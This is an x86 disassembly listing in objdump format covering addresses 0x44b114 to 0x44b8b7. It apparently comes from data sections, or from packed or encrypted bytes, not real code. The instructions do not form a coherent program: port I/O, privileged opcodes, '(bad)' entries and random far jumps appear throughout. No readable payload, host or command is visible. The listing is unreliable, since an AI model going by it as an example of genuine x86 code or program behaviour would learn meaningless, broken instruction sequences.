  44b114:	and    bl,BYTE PTR [ecx+0x1122ad2]
  44b11a:	adc    eax,0x7b99f206
  44b11f:	in     eax,0xdf
  44b121:	and    edi,ebx
  44b123:	lods   al,BYTE PTR ds:[esi]
  44b124:	xchg   BYTE PTR [ebp-0x1d],ch
  44b127:	int3   
  44b128:	cdq    
  44b129:	push   edx
  44b12a:	mov    ebp,0x3e4d4014
  44b12f:	cmc    
  44b130:	inc    ebp
  44b131:	std    
  44b132:	iret   
  44b133:	in     al,0x3
  44b135:	push   ebx
  44b136:	out    dx,eax
  44b137:	idiv   BYTE PTR [ebp+0x4e703eb0]
  44b13d:	mov    ecx,0xac36b719
  44b142:	mov    edx,0x9b9f2634
  44b147:	mov    dl,al
  44b149:	and    eax,0xb43a03dc
  44b14e:	jns    0x44b1a4
  44b150:	fst    DWORD PTR [ebx+0x71174b6]
  44b156:	ret    
  44b157:	icebp  
  44b158:	lds    ebx,FWORD PTR [edx+0x6ddcf1fd]
  44b15e:	les    ebx,FWORD PTR [edi-0x58ce16e4]
  44b164:	xchg   edi,eax
  44b165:	aam    0xf9
  44b167:	inc    edx
  44b168:	mov    BYTE PTR [ebx+edx*2],0xab
  44b16c:	sub    al,0xc8
  44b16e:	fwait
  44b16f:	not    BYTE PTR [esi+0x4a8e6af1]
  44b175:	xchg   edi,eax
  44b176:	sbb    dl,BYTE PTR [ebx]
  44b178:	leave  
  44b179:	fnstsw WORD PTR [esp+eiz*4-0x3317075f]
  44b180:	in     eax,0x18
  44b182:	int3   
  44b183:	in     al,0x16
  44b185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b186:	xchg   edx,eax
  44b187:	je     0x44b163
  44b189:	jl     0x44b16c
  44b18b:	mov    ah,0xa6
  44b18d:	xchg   esi,edx
  44b18f:	sbb    edx,edx
  44b191:	and    BYTE PTR [eax+0x38],bl
  44b194:	out    dx,al
  44b195:	ret    
  44b196:	mov    ebx,0x3d25efaa
  44b19b:	jg     0x44b1bb
  44b19d:	xchg   DWORD PTR [edx+0x6e],edi
  44b1a0:	and    DWORD PTR [ecx-0x79],ebx
  44b1a3:	(bad)  
  44b1a4:	addr16 jmp 0xd303892e
  44b1aa:	fwait
  44b1ab:	dec    esi
  44b1ac:	jge    0x44b1d9
  44b1ae:	ins    BYTE PTR es:[edi],dx
  44b1af:	les    esp,FWORD PTR [ebx]
  44b1b1:	and    DWORD PTR [ebp+ecx*1-0x3430f69a],ebp
  44b1b8:	mov    bh,0x27
  44b1ba:	aad    0xbd
  44b1bc:	add    al,0x8f
  44b1be:	mov    esp,0x6b42d734
  44b1c3:	repz lds ebp,FWORD PTR [ecx]
  44b1c6:	push   0x301234f4
  44b1cb:	ret    0xe919
  44b1ce:	cwde   
  44b1cf:	hlt    
  44b1d0:	test   al,0x81
  44b1d2:	bnd jmp 0x44b223
  44b1d5:	mov    eax,ds:0xefe2afeb
  44b1da:	add    al,0x36
  44b1dc:	bsf    esp,esp
  44b1df:	pusha  
  44b1e0:	sub    BYTE PTR [edx-0x4c],al
  44b1e3:	je     0x44b1dd
  44b1e5:	mov    ch,0xf8
  44b1e7:	pushf  
  44b1e8:	pop    ebx
  44b1e9:	mov    fs,esp
  44b1eb:	data16 ds ss mov dl,0xb4
  44b1f0:	xchg   BYTE PTR [edx+0x392530fa],al
  44b1f6:	ja     0x44b244
  44b1f8:	sbb    DWORD PTR [ebp-0x13],eax
  44b1fb:	fwait
  44b1fc:	mov    cl,0x9b
  44b1fe:	mov    ebx,0x547b18c3
  44b203:	mov    bl,0xd
  44b205:	push   esp
  44b206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b207:	xchg   esi,eax
  44b208:	xchg   edi,eax
  44b209:	in     al,dx
  44b20a:	and    al,0xf5
  44b20c:	sub    DWORD PTR [ebx],eax
  44b20e:	add    dh,BYTE PTR [ecx+0x6202c747]
  44b214:	fnstcw WORD PTR gs:[ebx+0x4ede7bec]
  44b21b:	pop    ebp
  44b21c:	(bad)  
  44b21d:	jl     0x44b1f8
  44b21f:	jnp    0x44b24e
  44b221:	push   esp
  44b222:	add    eax,0xb78d5cee
  44b227:	inc    edi
  44b228:	mov    ch,0xf
  44b22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b22b:	in     eax,dx
  44b22c:	call   0x5f0671e8
  44b231:	adc    BYTE PTR [ebp-0x46043dd2],dl
  44b237:	test   BYTE PTR [esi+0x12],ch
  44b23a:	ins    BYTE PTR es:[edi],dx
  44b23b:	pop    ss
  44b23c:	jp     0x44b23b
  44b23e:	mov    bl,0xff
  44b240:	jbe    0x44b1e2
  44b242:	sti    
  44b243:	ret    0x3d6d
  44b246:	pop    edi
  44b247:	push   esi
  44b248:	pushf  
  44b249:	xchg   ebp,eax
  44b24a:	and    cl,bl
  44b24c:	enter  0xc880,0xb
  44b250:	lods   eax,DWORD PTR ds:[esi]
  44b251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b252:	mov    ch,0xe4
  44b254:	clc    
  44b255:	or     BYTE PTR [edi],0x60
  44b258:	out    0xd,al
  44b25a:	add    eax,esi
  44b25c:	or     DWORD PTR [ebp-0x4b],esi
  44b25f:	sbb    DWORD PTR [ebp-0x790b66af],ecx
  44b265:	int3   
  44b266:	js     0x44b27a
  44b268:	loopne 0x44b245
  44b26a:	in     al,dx
  44b26b:	in     eax,0x83
  44b26d:	sbb    eax,0x5b4ac4ba
  44b272:	jge    0x44b222
  44b274:	std    
  44b275:	popf   
  44b276:	dec    ebx
  44b277:	sti    
  44b278:	mov    esp,0x251e20ce
  44b27d:	imul   esi,ebp,0xf8f2c15c
  44b283:	cmp    eax,0x94a365ba
  44b288:	aad    0x22
  44b28a:	push   ss
  44b28b:	out    dx,eax
  44b28c:	into   
  44b28d:	test   BYTE PTR [ecx-0x37],bh
  44b290:	aas    
  44b291:	cdq    
  44b292:	je     0x44b29e
  44b294:	push   esp
  44b295:	add    DWORD PTR [ebx],esp
  44b297:	push   esi
  44b298:	and    BYTE PTR [esi+0x24aeefcb],0x1b
  44b29f:	(bad)  
  44b2a0:	cmp    BYTE PTR [ebx+0x397bca11],bl
  44b2a6:	mov    edi,0xee332154
  44b2ab:	push   es
  44b2ac:	inc    ebp
  44b2ad:	mov    cl,dh
  44b2af:	out    0x98,eax
  44b2b1:	pop    edi
  44b2b2:	ins    BYTE PTR es:[edi],dx
  44b2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b2b4:	and    BYTE PTR [ecx-0x8],cl
  44b2b7:	inc    ebx
  44b2b8:	xchg   ebp,eax
  44b2b9:	stos   DWORD PTR es:[edi],eax
  44b2ba:	test   al,0xb1
  44b2bc:	jecxz  0x44b25b
  44b2be:	mov    edx,0x373c0536
  44b2c3:	in     eax,0xea
  44b2c5:	lea    eax,[ebp+0x66]
  44b2c8:	push   esi
  44b2c9:	push   0x921a652
  44b2ce:	xchg   ebx,eax
  44b2cf:	adc    al,0x35
  44b2d1:	mov    al,0xad
  44b2d3:	xor    BYTE PTR [edx],ah
  44b2d5:	mov    ds:0x17a375b,al
  44b2da:	inc    ax
  44b2dc:	sub    edx,edx
  44b2de:	rcr    BYTE PTR [ecx-0x141159f],1
  44b2e4:	xor    bh,cl
  44b2e6:	jge    0x44b2f4
  44b2e8:	add    cl,BYTE PTR [ebp-0x11]
  44b2eb:	ficom  WORD PTR [ecx+ebp*4]
  44b2ee:	xor    al,0x15
  44b2f0:	(bad)  
  44b2f1:	mov    eax,ds:0xf3d800fb
  44b2f6:	jge    0x44b29e
  44b2f8:	fldcw  WORD PTR [ebp-0x48d6a0c1]
  44b2fe:	mov    edx,0x83f745e4
  44b303:	shl    ebp,1
  44b305:	pop    eax
  44b306:	pop    edx
  44b307:	out    dx,eax
  44b308:	sbb    eax,0x24ab51f4
  44b30d:	pop    ecx
  44b30e:	fld    TBYTE PTR ds:0xb619feae
  44b314:	mov    eax,ds:0xb26fed25
  44b319:	daa    
  44b31a:	arpl   WORD PTR ds:0x570abce4,dx
  44b320:	add    eax,0x6df142bf
  44b325:	and    eax,edx
  44b327:	aas    
  44b328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b329:	imul   edx,DWORD PTR [ecx],0x59
  44b32c:	jmp    0xb652:0x6a00992
  44b333:	xor    BYTE PTR [edx+0x19],cl
  44b336:	cs pop edx
  44b338:	mov    WORD PTR [ecx],fs
  44b33a:	mov    eax,ds:0x6d110f14
  44b33f:	call   0xf0cd34d9
  44b344:	add    eax,0x18f67f16
  44b349:	sub    DWORD PTR [edi],ecx
  44b34b:	aam    0x8b
  44b34d:	std    
  44b34e:	push   0xfb9f39a3
  44b353:	mov    bh,0xa0
  44b355:	jnp    0x44b313
  44b357:	push   esi
  44b358:	jae    0x44b3a4
  44b35a:	scas   al,BYTE PTR es:[edi]
  44b35b:	lock adc al,0x39
  44b35e:	mov    al,0x64
  44b360:	mov    edx,0x250c458c
  44b365:	jl     0x44b33a
  44b367:	in     eax,0x70
  44b369:	jbe    0x44b3d9
  44b36b:	or     al,0xe8
  44b36d:	and    BYTE PTR [ecx+0x30],cl
  44b370:	jmp    0x44b3da
  44b372:	ret    
  44b373:	mov    ah,0x96
  44b375:	and    BYTE PTR [ecx+0x7c],al
  44b378:	shl    DWORD PTR [ebx-0x50],cl
  44b37b:	call   0xf3bb47e5
  44b380:	mov    bl,0xe7
  44b382:	(bad)
  44b387:	sub    BYTE PTR ds:0x70f13e72,dh
  44b38d:	into   
  44b38e:	test   BYTE PTR [eax-0x79],ah
  44b391:	pop    ebp
  44b392:	rcr    esi,0xa1
  44b395:	dec    edi
  44b396:	mov    al,0xf3
  44b398:	or     eax,0x12c36921
  44b39d:	cmp    DWORD PTR [ecx+0x5122df4],esi
  44b3a3:	(bad)
  44b3a7:	shl    DWORD PTR [ecx+0x3f],cl
  44b3aa:	mov    ebx,0xce896bac
  44b3af:	mov    DWORD PTR [ecx],ecx
  44b3b1:	and    DWORD PTR [edx-0x45ce663b],ebx
  44b3b7:	icebp  
  44b3b8:	dec    edx
  44b3b9:	fwait
  44b3ba:	imul   ebx,DWORD PTR [edi+0x15],0x4e
  44b3be:	xchg   edi,eax
  44b3bf:	cdq    
  44b3c0:	stos   DWORD PTR es:[edi],eax
  44b3c1:	aad    0x6a
  44b3c3:	outs   dx,BYTE PTR ds:[esi]
  44b3c4:	sbb    ebx,DWORD PTR [ecx-0x49]
  44b3c7:	jnp    0x44b35d
  44b3c9:	fisub  WORD PTR [edx-0x5]
  44b3cc:	inc    esi
  44b3cd:	adc    al,0xac
  44b3cf:	sub    eax,DWORD PTR [ebx]
  44b3d1:	mov    BYTE PTR [bx+0x85a],cl
  44b3d6:	int3   
  44b3d7:	repnz sub DWORD PTR [ecx-0x54],ebp
  44b3db:	inc    ecx
  44b3dc:	xchg   edx,eax
  44b3dd:	or     DWORD PTR [ebx],0xffffffa2
  44b3e0:	xchg   BYTE PTR [edi],ah
  44b3e2:	dec    ebx
  44b3e3:	jp     0x44b38e
  44b3e5:	lahf   
  44b3e6:	jnp    0x44b3b3
  44b3e8:	icebp  
  44b3e9:	or     eax,0x6cebc5eb
  44b3ee:	or     ebp,esi
  44b3f0:	add    al,0xa8
  44b3f2:	ret    0x4fb4
  44b3f5:	imul   esi,DWORD PTR [edx+0x3b42a509],0x5812531
  44b3ff:	in     eax,dx
  44b400:	jns    0x44b416
  44b402:	xor    esp,ebx
  44b404:	(bad)  
  44b405:	fscale 
  44b407:	loop   0x44b397
  44b409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b40a:	jnp    0x44b458
  44b40c:	test   cl,cl
  44b40e:	imul   edi,DWORD PTR [esi],0xe9dfa3a5
  44b414:	cmp    BYTE PTR ss:[ebx],dh
  44b417:	into   
  44b418:	xor    ecx,ebx
  44b41a:	or     eax,0x562017af
  44b41f:	call   0xedf44c7e
  44b424:	lds    ebp,FWORD PTR ds:0x32c2ed8c
  44b42a:	mov    ah,0xf5
  44b42c:	inc    ebx
  44b42d:	sub    DWORD PTR [edi+0x48],esi
  44b430:	dec    ecx
  44b431:	mov    edi,0xe679f65d
  44b436:	and    eax,0x8f75e6ee
  44b43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b43c:	and    eax,0x62cdfb99
  44b441:	mov    esp,0x455cd906
  44b446:	inc    ecx
  44b447:	lds    ecx,FWORD PTR [ebx+0x435d84f9]
  44b44d:	arpl   WORD PTR [ebx-0x12],bp
  44b450:	pop    ds
  44b451:	imul   edx,DWORD PTR [edi+0x568b6a44],0xdbd8c6d1
  44b45b:	ret    0x4fde
  44b45e:	nop
  44b45f:	jp     0x44b481
  44b461:	push   es
  44b462:	mov    ebp,0x65322092
  44b467:	(bad)  
  44b468:	adc    esp,DWORD PTR [edx]
  44b46a:	mov    edi,0x887d4284
  44b46f:	push   es
  44b470:	test   edx,ecx
  44b472:	shr    bl,0x0
  44b475:	sar    edx,0x19
  44b478:	in     eax,dx
  44b479:	sub    ah,BYTE PTR [ebx-0x4665f0bd]
  44b47f:	out    0x1d,eax
  44b481:	push   ebp
  44b482:	shl    DWORD PTR [ebp+0x7ccfa51e],cl
  44b488:	push   es
  44b489:	popa   
  44b48a:	jp     0x44b467
  44b48c:	retf   
  44b48d:	out    dx,eax
  44b48e:	outs   dx,BYTE PTR ds:[esi]
  44b48f:	xchg   esi,eax
  44b490:	pop    esi
  44b491:	jmp    0x44b473
  44b493:	and    al,0x34
  44b495:	inc    esp
  44b496:	mov    dl,0x3f
  44b498:	shl    DWORD PTR [eax],0xe8
  44b49b:	fs or  dh,dl
  44b49e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b49f:	shl    BYTE PTR [ebx],1
  44b4a1:	or     dh,al
  44b4a3:	aam    0x64
  44b4a5:	call   0x574d:0x1cd64e0b
  44b4ac:	mov    ah,0x57
  44b4ae:	ret    
  44b4af:	clc    
  44b4b0:	xor    BYTE PTR [edx+0x6bd454b1],cl
  44b4b6:	mov    edx,0xf313ef45
  44b4bc:	das    
  44b4bd:	and    esi,edi
  44b4bf:	int    0x27
  44b4c1:	stc    
  44b4c2:	push   0x47a757e0
  44b4c7:	mov    dl,0x24
  44b4c9:	outs   dx,DWORD PTR es:[esi]
  44b4cb:	pcmpgtd mm0,mm5
  44b4ce:	es push edi
  44b4d0:	(bad)  
  44b4d1:	push   ebp
  44b4d2:	push   ds
  44b4d3:	cdq    
  44b4d4:	fwait
  44b4d5:	mov    edi,0x591b34b4
  44b4da:	xor    BYTE PTR [edi],dl
  44b4dc:	xchg   BYTE PTR [esi],ah
  44b4de:	and    al,0x95
  44b4e0:	xlat   BYTE PTR ds:[ebx]
  44b4e1:	test   al,0xeb
  44b4e3:	mov    ch,0x68
  44b4e5:	test   DWORD PTR [eax-0x77d25fd2],0xbf383589
  44b4ef:	les    edi,FWORD PTR [ebp-0x63]
  44b4f2:	sub    BYTE PTR [ebp-0xb],bl
  44b4f5:	pop    edi
  44b4f6:	call   0x728:0x1452cfef
  44b4fd:	xor    DWORD PTR [ecx-0x4230379a],0x5b0403e4
  44b507:	dec    eax
  44b508:	aad    0x56
  44b50a:	fldl2e 
  44b50c:	int3   
  44b50d:	or     BYTE PTR [edi],dh
  44b50f:	sub    BYTE PTR [ebx-0x1ac9af74],bl
  44b515:	call   0xfd5c9af6
  44b51a:	pop    edx
  44b51b:	iret   
  44b51c:	jbe    0x44b4ee
  44b51e:	add    DWORD PTR ds:0x9e14f370,edx
  44b524:	mov    cl,0x78
  44b526:	or     al,0xed
  44b528:	and    eax,0xf2952679
  44b52d:	inc    ebp
  44b52e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b530:	outs   dx,BYTE PTR ds:[esi]
  44b531:	mov    cl,0x5b
  44b533:	push   0xec7212b7
  44b538:	add    ah,BYTE PTR [eax]
  44b53a:	jp     0x44b5a6
  44b53c:	aad    0xac
  44b53e:	mov    edi,0x5cba0ff8
  44b543:	push   es
  44b544:	int    0x1
  44b546:	mov    al,0x4
  44b548:	outs   dx,DWORD PTR ds:[esi]
  44b549:	lahf   
  44b54a:	mov    eax,ecx
  44b54c:	mov    cl,0xc9
  44b54e:	mov    bh,0xc0
  44b550:	out    dx,eax
  44b551:	fcom   st(4)
  44b553:	out    0x13,al
  44b555:	loope  0x44b509
  44b557:	aam    0xce
  44b559:	aam    0x1a
  44b55b:	jp     0x44b512
  44b55d:	mov    ebx,0xa7f3e671
  44b562:	iret   
  44b563:	sub    DWORD PTR [eax],ebx
  44b565:	leave  
  44b566:	sbb    esi,DWORD PTR [ebp+0x239830a]
  44b56c:	inc    ecx
  44b56d:	cdq    
  44b56e:	pop    ebx
  44b56f:	in     al,dx
  44b570:	cdq    
  44b571:	mov    ebp,0x8b7959a2
  44b576:	repnz (bad) 
  44b578:	pop    ds
  44b579:	cdq    
  44b57a:	mov    eax,ds:0x1e8d8e9c
  44b57f:	ret    0x8945
  44b582:	fwait
  44b583:	or     edi,DWORD PTR [ebx]
  44b585:	xlat   BYTE PTR ds:[ebx]
  44b586:	leave  
  44b587:	imul   esp,DWORD PTR [ecx+0x5f135a4],0xfffffff1
  44b58e:	add    esi,ecx
  44b590:	or     BYTE PTR [edx-0x69fd309],bh
  44b596:	aaa    
  44b597:	mov    ds:0xadc2ab3d,eax
  44b59c:	add    BYTE PTR [ecx-0x43],dh
  44b59f:	rol    BYTE PTR [ebp-0x23],1
  44b5a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b5a3:	out    dx,eax
  44b5a4:	sar    DWORD PTR [esi],0x7b
  44b5a7:	inc    eax
  44b5a9:	lods   al,BYTE PTR ds:[esi]
  44b5aa:	popf   
  44b5ab:	jne    0x44b61a
  44b5ad:	sub    eax,0xe395e81b
  44b5b2:	push   cs
  44b5b3:	enter  0xe135,0xea
  44b5b7:	call   0xb0dcce9c
  44b5bc:	sbb    eax,0x3426b459
  44b5c1:	mov    ah,0xcf
  44b5c3:	and    ch,BYTE PTR [ebp-0x5c]
  44b5c6:	retf   
  44b5c7:	mov    esp,0xa80425a2
  44b5cc:	out    0x9e,eax
  44b5ce:	inc    ecx
  44b5cf:	outs   dx,BYTE PTR gs:[esi]
  44b5d1:	ret    
  44b5d2:	faddp  st(4),st
  44b5d4:	retf   
  44b5d5:	mov    ds:0x9b407501,eax
  44b5da:	stos   DWORD PTR es:[edi],eax
  44b5db:	or     al,0xdb
  44b5dd:	cmp    eax,0xf6eda144
  44b5e2:	(bad)
  44b5e5:	pop    es
  44b5e6:	in     eax,0x14
  44b5e8:	and    DWORD PTR [eax+0x7f0c09d5],esp
  44b5ee:	dec    ebp
  44b5ef:	pop    ss
  44b5f0:	mov    dl,0xa5
  44b5f2:	jg     0x44b595
  44b5f4:	and    esp,DWORD PTR [esi-0x2]
  44b5f7:	adc    al,0xd9
  44b5f9:	clc    
  44b5fa:	jmp    0x2fed2bdd
  44b5ff:	jne    0x44b617
  44b601:	push   edx
  44b602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b603:	in     eax,dx
  44b604:	xchg   edx,eax
  44b605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b606:	jmp    0x44b658
  44b608:	adc    eax,0x8a2dd9bb
  44b60d:	inc    ecx
  44b60e:	xchg   BYTE PTR [edi+0x14bf684f],ch
  44b614:	or     bl,BYTE PTR [ecx+0x2c]
  44b617:	add    ch,dh
  44b619:	clc    
  44b61a:	push   edx
  44b61b:	out    dx,al
  44b61c:	nop
  44b61d:	lock stc 
  44b61f:	pop    ds
  44b620:	sbb    ebx,DWORD PTR [ecx-0x858626b]
  44b626:	cmp    cl,BYTE PTR [ecx-0x49ec9576]
  44b62c:	mov    ch,0xbb
  44b62e:	sbb    ebp,ebp
  44b630:	ret    
  44b631:	cmp    al,0x6a
  44b633:	and    ebp,DWORD PTR es:[ecx]
  44b636:	sahf   
  44b637:	addr16 std 
  44b639:	mov    cl,0x76
  44b63b:	jne    0x44b664
  44b63d:	mov    ds:0xb1c54709,al
  44b642:	repz lock arpl bx,sp
  44b646:	push   cs
  44b647:	xor    bl,BYTE PTR [edi]
  44b649:	jns    0x44b629
  44b64b:	xchg   esp,eax
  44b64c:	and    al,0x84
  44b64e:	es in  al,0xf3
  44b651:	or     al,0x6c
  44b653:	mov    eax,ds:0x997664ad
  44b658:	inc    edi
  44b659:	repz pop ecx
  44b65b:	icebp  
  44b65c:	sbb    bl,BYTE PTR [ecx-0x193a79a0]
  44b662:	mov    bh,0x61
  44b664:	cmp    DWORD PTR [ebx+0x53552762],ebx
  44b66a:	pop    ebx
  44b66b:	lock xor edi,ebx
  44b66e:	ret    
  44b66f:	push   ds
  44b670:	sbb    DWORD PTR [ecx+0x1b565d1d],ebx
  44b676:	ja     0x44b66e
  44b678:	push   eax
  44b679:	call   0x377c:0x833cd07b
  44b680:	leave  
  44b681:	and    al,0xa5
  44b683:	fidiv  DWORD PTR [eiz*1-0x412fcb41]
  44b68a:	ds mov ebx,0xf8ed5e35
  44b690:	and    al,0x15
  44b692:	mov    esp,0x7b48076e
  44b697:	icebp  
  44b698:	mov    WORD PTR [ebp-0x41],es
  44b69b:	adc    al,0x19
  44b69d:	popf   
  44b69e:	adc    DWORD PTR [esi+0x6],ebp
  44b6a1:	xchg   ebx,eax
  44b6a2:	sub    ch,BYTE PTR [edx+ebp*8]
  44b6a5:	cdq    
  44b6a6:	repz in al,0xbd
  44b6a9:	inc    ebx
  44b6aa:	add    al,0xe1
  44b6ac:	dec    ebx
  44b6ad:	push   eax
  44b6ae:	mov    ecx,0xd430e314
  44b6b3:	xor    al,0x45
  44b6b5:	jp     0x44b6a0
  44b6b7:	out    0x62,eax
  44b6b9:	xor    BYTE PTR [ebx-0x1118dc35],ah
  44b6bf:	push   0x4b
  44b6c1:	pop    es
  44b6c2:	mov    cl,0xc4
  44b6c4:	mov    eax,ds:0x96828ca7
  44b6c9:	pminub mm0,QWORD PTR [eax+0x1e]
  44b6cd:	popf   
  44b6ce:	xchg   edi,eax
  44b6cf:	repz adc BYTE PTR [edx+ebp*4-0x2],ah
  44b6d4:	or     edi,DWORD PTR [edx-0x41]
  44b6d7:	sbb    BYTE PTR fs:[edi-0x3a63bb6],bl
  44b6de:	push   edx
  44b6df:	ret    0x1b7b
  44b6e2:	mov    ecx,0x19df63bc
  44b6e7:	inc    ecx
  44b6e8:	hlt    
  44b6e9:	xor    BYTE PTR [edi-0x4f7b4ea9],bl
  44b6ef:	in     al,0x9c
  44b6f1:	leave  
  44b6f2:	sbb    edi,DWORD PTR [edx-0x6dafd82a]
  44b6f8:	pop    es
  44b6f9:	(bad)  
  44b6fa:	outs   dx,DWORD PTR ds:[esi]
  44b6fb:	pushf  
  44b6fc:	pushf  
  44b6fd:	mov    ds:0x5b6306a2,eax
  44b702:	adc    ebp,0x17
  44b705:	leave  
  44b706:	mov    ?,WORD PTR [edi+edx*2-0x520ee6a7]
  44b70d:	sahf   
  44b70e:	or     ecx,DWORD PTR [edi+ebp*2]
  44b711:	jle    0x44b6ac
  44b713:	xchg   ebp,eax
  44b714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b715:	clc    
  44b716:	pop    edi
  44b717:	xchg   ebp,eax
  44b718:	inc    edi
  44b719:	pop    eax
  44b71a:	out    0x34,eax
  44b71c:	fstp   QWORD PTR [esi]
  44b71e:	cmp    al,BYTE PTR [edx-0x62b46023]
  44b724:	std    
  44b725:	mov    dh,0x2e
  44b727:	(bad)  
  44b728:	sahf   
  44b729:	mov    ah,0x4
  44b72b:	outs   dx,BYTE PTR ds:[esi]
  44b72c:	adc    BYTE PTR [ebp+0x10a2f4bd],dh
  44b732:	mov    al,ds:0x751da5d3
  44b737:	repz dec esp
  44b739:	jl     0x44b792
  44b73b:	cwde   
  44b73c:	jmp    0x8175:0x1b53d1fa
  44b743:	push   0x81091d42
  44b748:	inc    ebp
  44b749:	(bad)  
  44b74b:	jmp    0x44b6dd
  44b74d:	gs mov bl,0x16
  44b750:	sbb    ecx,ebp
  44b752:	mov    eax,ds:0xee0b6236
  44b757:	pop    es
  44b758:	dec    eax
  44b759:	xchg   edi,eax
  44b75a:	std    
  44b75b:	adc    eax,0xaf5b9eff
  44b760:	xor    eax,0x208f3905
  44b765:	jns    0x44b73c
  44b767:	and    DWORD PTR [esp+ebp*8-0x61],0xffffffeb
  44b76c:	sbb    eax,0x38e92ba0
  44b771:	pop    es
  44b772:	mov    ?,WORD PTR [ecx]
  44b774:	sbb    ah,BYTE PTR [ebx]
  44b776:	pop    edi
  44b777:	jmp    0x2133:0xd6afd800
  44b77e:	mov    eax,0xbb9fddbc
  44b783:	ja     0x44b726
  44b785:	shl    DWORD PTR [ebx+0x66],cl
  44b788:	les    ebx,FWORD PTR [eax-0x287954a1]
  44b78e:	mov    ecx,0xa7731e04
  44b793:	(bad)  
  44b794:	gs mov dl,0xa5
  44b797:	lock les esp,FWORD PTR [ebx]
  44b79a:	inc    esp
  44b79b:	inc    edx
  44b79c:	and    ebx,ecx
  44b79e:	in     al,0x98
  44b7a0:	daa    
  44b7a1:	cmovbe eax,edi
  44b7a4:	xor    eax,0x45817c0c
  44b7a9:	mov    ebp,0xda288b80
  44b7ae:	xor    eax,0x703919f3
  44b7b3:	adc    edx,DWORD PTR [esi+0x183f8d7c]
  44b7b9:	xchg   edx,eax
  44b7ba:	dec    ebp
  44b7bb:	cmp    DWORD PTR [edi],ecx
  44b7bd:	sbb    BYTE PTR [edi+ecx*1+0x1f],bl
  44b7c1:	call   0x854e:0x9ebd2053
  44b7c8:	stos   DWORD PTR es:[edi],eax
  44b7c9:	adc    esi,DWORD PTR [edi+0x39c6d8c4]
  44b7cf:	and    al,0x9
  44b7d1:	inc    eax
  44b7d2:	cmp    al,BYTE PTR [esi-0x33484ccd]
  44b7d8:	cld    
  44b7d9:	cdq    
  44b7da:	lahf   
  44b7db:	mov    esi,0xc4b782b2
  44b7e0:	or     BYTE PTR [edx+edx*8-0x37930a07],dh
  44b7e7:	jmp    0xd91b:0xbdfbf756
  44b7ee:	data16 loop 0x44b856
  44b7f1:	jno    0x44b854
  44b7f3:	std    
  44b7f4:	cmp    DWORD PTR [eax+0x7ef686b],0x55
  44b7fb:	inc    ecx
  44b7fc:	shl    BYTE PTR [ebx-0x17],0x83
  44b800:	jecxz  0x44b7bc
  44b802:	push   ds
  44b803:	sub    dh,dh
  44b805:	ins    DWORD PTR es:[edi],dx
  44b806:	loopne 0x44b811
  44b808:	push   edi
  44b809:	push   eax
  44b80a:	pop    ss
  44b80b:	in     eax,dx
  44b80c:	in     eax,dx
  44b80d:	iret   
  44b80e:	retf   
  44b80f:	lods   al,BYTE PTR ds:[esi]
  44b810:	stos   DWORD PTR es:[edi],eax
  44b811:	leave  
  44b812:	cmp    DWORD PTR [ecx-0x5f],esp
  44b815:	cmc    
  44b816:	dec    edx
  44b817:	or     al,0x24
  44b819:	fnstcw WORD PTR [edx]
  44b81b:	jg     0x44b82d
  44b81d:	ret    0x75a2
  44b820:	imul   BYTE PTR [eax-0xc3d5085]
  44b826:	inc    esp
  44b827:	inc    edx
  44b828:	jmp    0x44b800
  44b82a:	jecxz  0x44b882
  44b82c:	mov    esp,0xd7a4be84
  44b831:	(bad)  
  44b833:	dec    ecx
  44b834:	add    eax,0x9aee3867
  44b839:	xchg   esp,eax
  44b83a:	repnz fwait
  44b83c:	and    BYTE PTR [ecx-0x17],bh
  44b83f:	setbe  BYTE PTR [edi-0x634d1ea3]
  44b846:	sbb    ebp,ebp
  44b848:	adc    al,0x93
  44b84a:	into   
  44b84b:	mov    edi,DWORD PTR [eax-0x26]
  44b84e:	mov    edi,0x129120b5
  44b853:	es push ds
  44b855:	ins    BYTE PTR es:[edi],dx
  44b856:	mov    edx,0x7cc3bad4
  44b85b:	cmp    bl,ah
  44b85d:	push   0x15c5abe6
  44b862:	iret   
  44b863:	out    dx,al
  44b864:	xor    eax,0x359688b0
  44b869:	clc    
  44b86a:	xchg   ebx,esi
  44b86c:	outs   dx,DWORD PTR ds:[si]
  44b86e:	jmp    0x44b8e4
  44b870:	lock cli 
  44b872:	loop   0x44b8b2
  44b874:	mov    cl,0xa8
  44b876:	ret    
  44b877:	pop    esp
  44b878:	aas    
  44b879:	and    esi,ebp
  44b87b:	ror    DWORD PTR [edx],0x9e
  44b87e:	sub    edi,DWORD PTR [edx]
  44b880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b881:	push   0x7b65710
  44b886:	les    eax,FWORD PTR ds:0x3fba196f
  44b88c:	xor    eax,0x1ee36bd4
  44b891:	sahf   
  44b892:	pop    ebp
  44b893:	pop    edi
  44b894:	dec    edi
  44b895:	shl    BYTE PTR [esi],cl
  44b897:	dec    esi
  44b898:	push   edi
  44b899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b89a:	arpl   WORD PTR ds:0xf1fb9d9a,dx
  44b8a0:	cmp    eax,DWORD PTR [ebx]
  44b8a2:	adc    esp,edx
  44b8a4:	xchg   esp,eax
  44b8a5:	dec    edx
  44b8a6:	mov    BYTE PTR [esi+0x1d],ch
  44b8a9:	or     esi,ecx
  44b8ab:	or     edx,DWORD PTR [ecx]
  44b8ad:	stc    
  44b8ae:	jecxz  0x44b848
  44b8b0:	add    BYTE PTR [edx],dl
  44b8b2:	lods   al,BYTE PTR ds:[esi]
  44b8b3:	rcr    BYTE PTR [edx],1
  44b8b5:	out    0x31,eax
  44b8b7:	sub    ebx,DWORD PTR [ecx+ecx*4]
